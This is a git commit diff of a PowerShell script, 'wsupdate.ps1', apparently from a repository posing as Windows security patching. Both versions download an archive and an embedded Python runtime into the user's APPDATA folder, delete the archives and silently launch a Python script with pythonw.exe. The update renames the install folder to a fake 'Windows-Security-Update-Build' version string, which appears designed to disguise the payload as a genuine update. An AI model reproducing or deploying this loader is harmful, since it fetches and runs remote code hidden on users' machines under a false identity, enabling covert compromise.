247a86d99f385a0c60ed97a46eed78a1344f2793
xxoo-d <im4x5yn74x@kaiju-security.com>
2026-02-24 22:57:05 -0500

    Update wsupdate.ps1

--- wsupdate.ps1
+++ wsupdate.ps1
@@ -1,11 +1,15 @@
-$Length = 10
-$Characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
-$RandomString = -join ($Characters.ToCharArray() | Get-Random -Count $Length)
-$FolderName = "$RandomString"
-wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurity.zip -O $env:APPDATA\WindowsSecurity.zip
-Expand-Archive -Path $env:APPDATA\WindowsSecurity.zip -DestinationPath $env:APPDATA\$FolderName
-wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
-Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\WindowsSecurity\
-rm $env:APPDATA\WindowsSecurity.zip
-rm $env:APPDATA\python-3.14.0-embed-amd64.zip
-& "$env:APPDATA\\$FolderName\\WindowsSecurity\\pythonw.exe" @("$env:APPDATA\$FolderName\WindowsSecurity\wssrvc.py")
+$MAJOR = Get-Random -Minimum 1 -Maximum 11
+$MINOR = Get-Random -Minimum 0 -Maximum 100
+$BUILD = Get-Random -Minimum 0 -Maximum 1000
+$REVISION = Get-Random -Minimum 0 -Maximum 10000
+$VERSION = "$MAJOR.$MINOR.$BUILD.$REVISION"
+$BuildVersion = "Windows-Security-Update-Build-$VERSION"
+$FolderName = "$BuildVersion"
+$AppDataPath = $env:APPDATA
+wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurity.zip -O $AppDataPath\WindowsSecurity.zip
+Expand-Archive -Path $AppDataPath\WindowsSecurity.zip -DestinationPath $AppDataPath\$FolderName
+wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $AppDataPath\python-3.14.0-embed-amd64.zip
+Expand-Archive -Path $AppDataPath\python-3.14.0-embed-amd64.zip -DestinationPath $AppDataPath\$FolderName\WindowsSecurity\
+rm $AppDataPath\WindowsSecurity.zip
+rm $AppDataPath\python-3.14.0-embed-amd64.zip
+& "$AppDataPath\\$FolderName\\WindowsSecurity\\pythonw.exe" @("$AppDataPath\$FolderName\WindowsSecurity\wssrvc.py")
